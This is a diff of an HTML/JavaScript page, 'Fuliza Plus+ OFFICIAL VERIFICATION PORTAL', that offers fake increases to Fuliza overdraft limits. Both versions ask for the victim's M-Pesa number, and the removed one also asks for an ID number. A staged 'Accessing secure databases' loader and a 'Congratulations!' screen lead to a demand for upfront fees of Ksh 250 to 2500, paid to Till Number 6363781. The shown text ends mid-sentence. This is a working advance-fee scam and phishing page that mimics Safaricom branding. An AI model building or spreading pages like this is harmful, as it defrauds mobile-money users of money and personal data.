@@ -1,233 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>FulizaBoost</title>
-
 <style>
-body {
-  font-family: Arial, sans-serif;
-  background: #f4f6f8;
-  margin: 0;
-  padding: 20px;
-}
-
-/* HEADER */
-.header {
-  text-align: center;
-}
-.header h1 { margin: 0; }
-
-/* GRID */
-.grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 12px;
-  margin-top: 20px;
-}
-
-.card {
-  background: #fff;
-  padding: 15px;
-  border-radius: 12px;
-  text-align: center;
-  cursor: pointer;
-  border: 2px solid transparent;
-}
-
-.card.active {
-  border: 2px solid green;
-  background: #eaf6ee;
-}
-
-.card h3 {
-  margin: 0;
-  color: green;
-}
-
-/* BUTTON */
-.upgrade-btn {
-  margin-top: 20px;
-  width: 100%;
-  padding: 15px;
-  background: green;
-  color: white;
-  border: none;
-  border-radius: 12px;
-}
-
-/* POPUP */
-.popup {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  display: none;
-  justify-content: center;
-  align-items: center;
-  background: rgba(0,0,0,0.5);
-}
-
-.popup-box {
-  width: 90%;
-  max-width: 350px;
-  background: white;
-  border-radius: 20px;
-  overflow: hidden;
-}
-
-/* TOP GREEN */
-.popup-top {
-  background: #23a455;
-  color: white;
-  padding: 15px;
-  font-weight: bold;
-}
-
-/* BODY */
-.popup-body {
-  padding: 15px;
-}
-
-.notice {
-  background: #e8f5ec;
-  padding: 12px;
-  border-radius: 10px;
-  font-size: 14px;
-  margin-bottom: 10px;
-}
-
-input {
-  width: 100%;
-  padding: 12px;
-  margin-top: 10px;
-  border-radius: 10px;
-  border: 1px solid #ccc;
-}
-
-/* BUTTONS */
-.actions {
-  display: flex;
-  gap: 10px;
-  margin-top: 15px;
-}
-
-.cancel {
-  flex: 1;
-  padding: 12px;
-  border-radius: 10px;
-  border: none;
-}
-
-.pay {
-  flex: 2;
-  background: #23a455;
-  color: white;
-  border: none;
-  border-radius: 10px;
-}
+body{font-family:Arial;background:#f4f6f8;margin:0}
+.container{padding:20px}
+.card{background:#fff;padding:25px;border-radius:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.08)}
+h1{margin:10px 0}
+p{color:#666}
+input{width:100%;padding:15px;border-radius:12px;border:1px solid #ddd;margin-top:10px;font-size:16px}
+button{width:100%;padding:15px;border:none;border-radius:12px;background:#1f9d4a;color:#fff;font-size:16px;margin-top:15px;font-weight:bold}
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;margin-top:15px}
+.limit{background:#fff;padding:20px;border-radius:15px;text-align:center;cursor:pointer;border:2px solid transparent}
+.limit.active{border-color:#1f9d4a}
+.fee{font-size:12px;color:#888}
+.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;justify-content:center;align-items:center}
+.modal-box{background:#fff;width:90%;border-radius:20px;overflow:hidden}
+.modal-header{background:#1f9d4a;color:#fff;padding:20px;font-weight:bold}
+.modal-body{padding:20px}
+.modal-body p{background:#e9f7ef;padding:15px;border-radius:10px;font-size:14px}
+.row{display:flex;gap:10px;margin-top:15px}
+.row button{flex:1}
+.cancel{background:#eee;color:#333}
+.loader{border:4px solid #eee;border-top:4px solid #1f9d4a;border-radius:50%;width:50px;height:50px;margin:auto;animation:spin 1s linear infinite}
+@keyframes spin{100%{transform:rotate(360deg)}}
+.hidden{display:none}
 </style>
 </head>
-
-<body>
-
-<div class="header">
-  <h1>FulizaBoost</h1>
-  <p>Select Your New Approved Limit</p>
+<body><div class="container" id="start">
+<div class="card">
+<h1>Fuliza Plus+</h1>
+<p>OFFICIAL VERIFICATION PORTAL</p>
+<input id="phone" placeholder="Enter M-Pesa Number">
+<button onclick="startProcess()">Check My Eligibility</button>
 </div>
-
+</div><div class="container hidden" id="loading">
+<div class="card">
+<div class="loader"></div>
+<h3 id="loadingText">Connecting...</h3>
+<p>Accessing secure databases...</p>
+</div>
+</div><div class="container hidden" id="success">
+<div class="card">
+<h2>Congratulations!</h2>
+<p id="result"></p>
+<button onclick="showLimits()">Proceed to Upgrade Limit</button>
+</div>
+</div><div class="container hidden" id="limits">
+<h2>Select Your New Approved Limit</h2>
 <div class="grid" id="grid"></div>
-
-<button class="upgrade-btn" onclick="openPopup()">
-  Upgrade Selected Limit
-</button>
-
-<!-- POPUP -->
-<div class="popup" id="popup">
-  <div class="popup-box">
-
-    <div class="popup-top">
-      Limit will be boosted to <span id="popupAmount"></span>
-    </div>
-
-    <div class="popup-body">
-      <div class="notice">
-        Enter your Safaricom number for VERIFICATION!  
-        Once payment to Till Number <b>6363781</b> is confirmed,
-        your boost request will begin processing.
-      </div>
-
-      <input type="text" placeholder="ID Number">
-      <input type="text" id="phone" placeholder="Phone Number">
-
-      <div class="actions">
-        <button class="cancel" onclick="closePopup()">Cancel</button>
-        <button class="pay" id="payBtn">Pay</button>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<script>
-const limits = [
-  {amount: 3000, fee: 250},
-  {amount: 5000, fee: 293},
-  {amount: 7500, fee: 350},
-  {amount: 10000, fee: 500},
-  {amount: 12500, fee: 747},
-  {amount: 16000, fee: 898},
-  {amount: 21000, fee: 1015},
-  {amount: 25500, fee: 1220},
-  {amount: 30000, fee: 1533},
-  {amount: 35000, fee: 1730},
-  {amount: 45000, fee: 2000},
-  {amount: 60000, fee: 2250},
-  {amount: 70000, fee: 2500}
-];
-
-let selected = null;
-
-const grid = document.getElementById("grid");
-
-limits.forEach(l => {
-  const div = document.createElement("div");
-  div.className = "card";
-
-  div.innerHTML = `
-    <h3>Ksh ${l.amount.toLocaleString()}</h3>
-    <small>Fee: ${l.fee}</small>
-  `;
-
-  div.onclick = () => {
-    document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
-    div.classList.add("active");
-    selected = l;
-  };
-
-  grid.appendChild(div);
-});
-
-function openPopup() {
-  if (!selected) {
-    alert("Select a limit first");
-    return;
-  }
-
-  document.getElementById("popup").style.display = "flex";
-  document.getElementById("popupAmount").innerText =
-    "Ksh " + selected.amount.toLocaleString();
-
-  document.getElementById("payBtn").innerText =
-    "Pay Ksh " + selected.fee;
-}
-
-function closePopup() {
-  document.getElementById("popup").style.display = "none";
-}
-</script>
-
-</body>
-</html>
+<button onclick="openModal()">UPGRADE</button>
+</div><div class="modal" id="modal">
+<div class="modal-box">
+<div class="modal-header" id="modalTitle"></div>
+<div class="modal-body">
+<p>Enter your Safaricom number for VERIFICATION! Once payment to Till Number <b>6363781</b
